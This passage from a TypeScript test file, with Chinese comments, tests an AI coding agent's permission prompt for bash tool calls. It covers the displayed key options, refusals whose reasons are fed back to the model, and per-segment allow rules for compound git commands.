        twoTurnStream(toolCallTurn("a1", "bash", { command: "git commit -m x" })),
        [shellFake(calls)],
        { messages: [{ role: "user", content: "x" }] },
        { confirm: s.confirm, rulesPath },
      ),
    );
    expect(s.prompts).toHaveLength(1);
    const disk = JSON.parse(await readFile(rulesPath, "utf8")) as Rule[];
    expect(printedRules(s.prompts[0] ?? "")).toEqual(disk.map((r) => `${r.tool}  ${r.prefix}`));
    expect(printedRules(s.prompts[0] ?? "")).toEqual(["bash  git commit:*"]);
  });

  // 弹面键位行与 mapConfirm 必须同档:此处钉住印面(测锚),输入流吞行仍归 C8 W 剧本人工跑。
  it("弹面第二行 = 四档键位(1 once / 2 session / 3 always / 4 No)", async () => {
    const calls = { n: 0 };
    const s = confirmSpy("yes");
    await collect(
      runLoop(
        twoTurnStream(toolCallTurn("k1", "bash", { command: "git push" })),
        [shellFake(calls)],
        { messages: [{ role: "user", content: "x" }] },
        { confirm: s.confirm, rulesPath: join(dir, "rules-c6f.json") },
      ),
    );
    expect(s.prompts[0]?.split("\n")[1]).toBe(
      "❯ 1 Yes (once)  2 Yes + session  3 Yes + always  4 No",
    );
  });
});

// C6 AC-3:拒 + 理由 → 理由进 toolResult 回喂模型(支撑"拒绝带反馈重试")。
describe("C6 AC-3:no + 理由回喂", () => {
  it("答 4 带理由 → toolResult isError 且文本含理由原文", async () => {
    const calls = { n: 0 };
    const s = confirmSpy("no", "这条会覆盖远端历史");
    const events = await collect(
      runLoop(
        twoTurnStream(toolCallTurn("r1", "bash", { command: "git push" })),
        [shellFake(calls)],
        { messages: [{ role: "user", content: "x" }] },
        { confirm: s.confirm, rulesPath: join(dir, "rules-c6d.json") },
      ),
    );
    const end = events.find((e) => e.type === "tool_execution_end");
    expect(end?.type).toBe("tool_execution_end");
    if (end?.type !== "tool_execution_end") return;
    expect(end.isError).toBe(true);
    expect((end.result as { content: { text: string }[] }).content[0]!.text).toContain(
      "这条会覆盖远端历史",
    );
    expect(calls.n).toBe(0); // 拒 = 不执行
  });
});

// C6 AC-4:复合命令 always 建议 = 每段一条,打印数 == 落盘数(同源一份数组渲染,不可能漂移)。
describe("C6 AC-4:复合命令逐段建议", () => {
  it("复合命令 `git status -sb && git diff HEAD` 答 always → 弹面 2 条规则行 == 落盘 2 条", async () => {
    const rulesPath = join(dir, "rules-c6e.json");
    const calls = { n: 0 };
    const s = confirmSpy("always");
    await collect(
      runLoop(
        twoTurnStream(toolCallTurn("m1", "bash", { command: "git status -sb && git diff HEAD" })),
        [shellFake(calls)],
        { messages: [{ role: "user", content: "x" }] },
        { confirm: s.confirm, rulesPath },
      ),
    );
    const disk = JSON.parse(await readFile(rulesPath, "utf8")) as Rule[];
    expect(disk).toEqual([
      { tool: "bash", prefix: "git status:*" },
      { tool: "bash", prefix: "git diff:*" },
    ]);
    expect(printedRules(s.prompts[0] ?? "")).toEqual(disk.map((r) => `${r.tool}  ${r.prefix}`));
    expect(s.prompts[0]).toContain("将落盘 2 条规则");
  });
});
